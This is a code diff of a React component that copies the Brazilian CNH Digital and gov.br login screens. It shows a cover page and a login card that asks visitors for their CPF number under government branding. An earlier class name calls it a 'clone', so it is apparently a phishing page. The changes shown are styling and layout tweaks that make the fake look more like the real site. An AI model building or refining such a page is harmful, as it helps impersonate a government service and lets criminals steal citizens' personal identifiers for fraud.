@@ -54,12 +54,12 @@ export default function CNHLanding() {
   return (
     <>
       <style>{`
-        .cnh-clone-wrapper {
+        .cnh-body-root {
           font-family: 'Raleway', 'Rawline', sans-serif;
           background-color: #000;
-          min-height: 100vh;
-          min-height: 100dvh;
-          width: 100%;
+          height: 100dvh;
+          width: 100vw;
+          overflow: hidden;
           display: flex;
           justify-content: center;
           align-items: center;
@@ -73,19 +73,17 @@ export default function CNHLanding() {
         #tela-capa {
           width: 100%;
           max-width: 450px;
-          height: 100vh;
-          height: 100dvh;
+          height: 100%;
           background-color: #fff;
           position: relative;
           display: flex;
           flex-direction: column;
-          box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
 
         .capa-area {
           height: 70%;
           width: 100%;
-          background-image: url('/img/capa_cnh.png'), url('/capa_cnh.png');
+          background-image: url('/img/capa_cnh.png');
           background-size: cover;
           background-position: center top;
           position: relative;
@@ -110,7 +108,7 @@ export default function CNHLanding() {
           margin-top: -25px;
           position: relative;
           z-index: 10;
-          padding: 20px 30px;
+          padding: 15px 30px;
           display: flex;
           flex-direction: column;
           align-items: center;
@@ -128,8 +126,8 @@ export default function CNHLanding() {
           text-align: center;
           font-size: 12px;
           color: #333;
-          line-height: 1.4;
-          margin-bottom: 12px;
+          line-height: 1.3;
+          margin-bottom: 5px;
         }
 
         .termos-texto a {
@@ -148,12 +146,8 @@ export default function CNHLanding() {
           font-size: 14px;
           font-weight: 700;
           cursor: pointer;
-          box-shadow: 0 4px 12px rgba(19, 81, 180, 0.3);
+          box-shadow: 0 4px 8px rgba(19, 81, 180, 0.25);
           text-transform: uppercase;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          gap: 8px;
         }
 
         @media (min-height: 800px) {
@@ -165,10 +159,10 @@ export default function CNHLanding() {
         }
 
         /* --- ESTILOS DA TELA 2: LOGIN --- */
-        #tela-login-wrapper {
+        #tela-login {
           width: 100%;
-          min-height: 100vh;
-          min-height: 100dvh;
+          max-width: 400px;
+          height: 100%;
           background-color: #f6f6f6;
           display: flex;
           flex-direction: column;
@@ -193,12 +187,10 @@ export default function CNHLanding() {
 
         .login-card {
           width: calc(100% - 40px);
-          max-width: 400px;
           background-color: #fff;
           padding: 24px 16px 22px;
           box-shadow: 0 2px 12px rgba(0, 0, 0, 0.16);
           box-sizing: border-box;
-          border-radius: 4px;
         }
 
         .title {
@@ -351,22 +343,49 @@ export default function CNHLanding() {
           color: #666;
           padding-bottom: 20px;
         }
+
+        @media (min-width: 768px) {
+          #tela-login .title {
+            font-size: 14.4px;
+          }
+
+          #tela-login .subtitle,
+          #tela-login .input-field,
+          #tela-login .btn-primary {
+            font-size: 12.8px;
+          }
+
+          #tela-login .description,
+          #tela-login .label,
+          #tela-login .alert-error,
+          #tela-login .options-title,
+          #tela-login .option-btn {
+            font-size: 11.2px;
+          }
+
+          #tela-login .option-btn i {
+            font-size: 12.8px;
+          }
+
+          #tela-login .selo {
+            font-size: 7px;
+            padding: 3px 4px;
+          }
+
+          #tela-login .footer {
+            font-size: 9.6px;
+          }
+        }
       `}</style>
 
-      {/* --- TELA 1: CAPA --- */}
-      {tela === "capa" && (
-        <div className="cnh-clone-wrapper">
-          <div id="tela-capa">
+      <div className="cnh-body-root">
+        {/* --- TELA 1: CAPA --- */}
+        {tela === "capa" && (
+          <div id="tela-capa" className="app-container">
             <div className="capa-area" />
             <div className="conteudo-branco">
               <div className="logo-container">
-                <img
-                  src="/img/logo_cnh.png"
-                  onError={(e) => {
-                    e.currentTarget.src = "/logo_cnh.png";
-                  }}
-                  alt="CNH Digital"
-                />
+                <img src="/img/logo_cnh.png" alt="CNH Digital" />
               </div>
               <div style={{ width: "100%" }}>
                 <div className="termos-texto">
@@ -375,86 +394,79 @@ export default function CNHLanding() {
                   <a href="#">Política de Privacidade</a>
                 </div>
                 <button className="btn-gov" onClick={() => setTela("login")}>
-                  ENTRAR COM <img src="/img/logo.png" onError={(e) => { e.currentTarget.src = "/logo.png"; }} alt="gov.br" className="h-4 w-auto inline-block" />
+                  ENTRAR COM gov.br
                 </button>
               </div>
             </div>
           </div>
-        </div>
-      )}
+        )}
 
-      {/* --- TELA 2: LOGIN --- */}
-      {tela === "login" && (
-        <div id="tela-login-wrapper">
-          <div className="header">
-            <img
-              src="/img/logo.png"
-              onError={(e) => {
-                e.currentTarget.src = "/logo.png";
-              }}
-              className="logo-gov-login"
-              alt="gov.br"
-            />
-          </div>
-          <div className="login-card">
-            <div className="title">Identifique-se no gov.br</div>
-            <div className="subtitle">
-              <i className="fas fa-id-card"></i> Número do CPF
+        {/* --- TELA 2: LOGIN --- */}
+        {tela === "login" && (
+          <div id="tela-login">
+            <div className="header">
+              <img src="/img/logo.png" className="logo-gov-login" alt="gov.br" />
             </div>
-            <div className="description">
-              Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
-            </div>
-
-            <div className="input-group">
-              <label className="label">CPF</label>
-              <input
-                type="tel"
-                id="campoCpf"
-                className="input-field"
-                placeholder="Digite seu CPF"
-                maxLength={14}
-                inputMode="numeric"
-                autoComplete="off"
-                value={cpf}
-                onChange={handleCpfChange}
-              />
-            </div>
-
-            {error && (
-              <div id="alert-erro" className="alert-error">
-                <i className="fas fa-exclamation-triangle"></i> {error}
+            <div className="login-card">
+              <div className="title">Identifique-se no gov.br</div>
+              <div className="subtitle">
+                <i className="fas fa-id-card"></i> Número do CPF
               </div>
-            )}
+              <div className="description">
+                Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
+              </div>
 
-            <button
-              className="btn-primary"
-              id="btnProximo"
-              onClick={handleContinue}
-              disabled={loading}
-            >
-              {loading ? "Verificando..." : "Continuar"}
-            </button>
+              <div className="input-group">
+                <label className="label">CPF</label>
+                <input
+                  type="tel"
+                  id="campoCpf"
+                  className="input-field"
+                  placeholder="Digite seu CPF"
+                  maxLength={14}
+                  inputMode="numeric"
+                  autoComplete="off"
+                  value={cpf}
+                  onChange={handleCpfChange}
+                />
+              </div>
 
-            <div className="options-title">Outras opções de identificação:</div>
-            <div className="option-btn">
-              <i className="fas fa-university"></i> Login com seu banco{" "}
-              <span className="selo">SUA CONTA SERÁ PRATA</span>
-            </div>
-            <div className="option-btn">
-              <i className="fas fa-qrcode"></i> Login com QR code
-            </div>
-            <div className="option-btn">
-              <i className="fas fa-mobile-alt"></i> Seu aplicativo gov.br
-            </div>
-            <div className="option-btn">
-              <i className="fas fa-cloud"></i> Seu certificado digital em nuvem
-            </div>
-            <div className="footer">
-              Ministério da Gestão e da Inovação em Serviços Públicos
+              {error && (
+                <div id="alert-erro" className="alert-error" style={{ display: "flex" }}>
+                  <i className="fas fa-exclamation-triangle"></i> {error}
+                </div>
+              )}
+
+              <button
+                className="btn-primary"
+                id="btnProximo"
+                onClick={handleContinue}
+                disabled={loading}
+              >
+                {loading ? "Verificando..." : "Continuar"}
+              </button>
+
+              <div className="options-title">Outras opções de identificação:</div>
+              <div className="option-btn">
+                <i className="fas fa-university"></i> Login com seu banco{" "}
+                <span className="selo">SUA CONTA SERÁ PRATA</span>
+              </div>
+              <div className="option-btn">
+                <i className="fas fa-qrcode"></i> Login com QR code
+              </div>
+              <div className="option-btn">
+                <i className="fas fa-mobile-alt"></i> Seu aplicativo gov.br
+              </div>
+              <div className="option-btn">
+                <i className="fas fa-cloud"></i> Seu certificado digital em nuvem
+              </div>
+              <div className="footer">
+                Ministério da Gestão e da Inovação em Serviços Públicos
+              </div>
             </div>
           </div>
-        </div>
-      )}
+        )}
+      </div>
     </>
   );
 }
